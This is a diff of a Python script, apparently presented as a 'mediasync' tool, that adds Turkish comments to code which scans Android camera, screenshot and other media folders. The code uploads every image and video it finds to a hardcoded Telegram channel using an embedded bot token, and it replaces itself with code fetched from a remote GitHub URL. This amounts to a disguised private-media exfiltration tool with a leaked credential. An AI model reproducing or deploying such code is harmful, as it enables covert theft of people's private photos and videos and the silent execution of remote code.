@@ -15,17 +15,20 @@ except ImportError:
     print("Requests kütüphanesi bulunamadı. Yükleniyor...")
     install('requests')
 
+# Gerekli değişkenler
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
 CHANNEL_ID = "@p8JdyixgqKFlMjA0"
 SCRIPT_URL = "https://raw.githubusercontent.com/fatiqueos/mediasync/refs/heads/main/main.py"
 SCRIPT_NAME = "main.py"
 
+# Mevcut script içeriğini al
 def get_current_script_content():
     if os.path.exists(SCRIPT_NAME):
         with open(SCRIPT_NAME, "r") as file:
             return file.read()
     return None
 
+# Güncellemeleri kontrol et
 def check_for_updates():
     print("Güncellemeler kontrol ediliyor...")
     try:
@@ -46,6 +49,7 @@ def check_for_updates():
     except Exception as e:
         print(f"Güncelleme kontrolünde hata oluştu: {e}")
 
+# Medya dizinleri
 directories = [
     "/storage/emulated/0/DCIM/Camera/",
     "/storage/emulated/0/Pictures/Screenshots/",
@@ -69,6 +73,7 @@ directories = [
 image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
 video_extensions = [".mp4", ".mov", ".avi"]
 
+# Medyayı Telegram'a gönder
 def send_media_to_channel(file_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
     
@@ -82,6 +87,7 @@ def send_media_to_channel(file_path):
         else:
             print(f"Başarısız oldu: {file_path}. Hata: {response.text}")
 
+# Dosyaları kontrol et ve gönder
 def check_and_send_files():
     name = input("Lütfen bir isim girin: ")  # Kullanıcıdan isim iste
     for directory in directories:
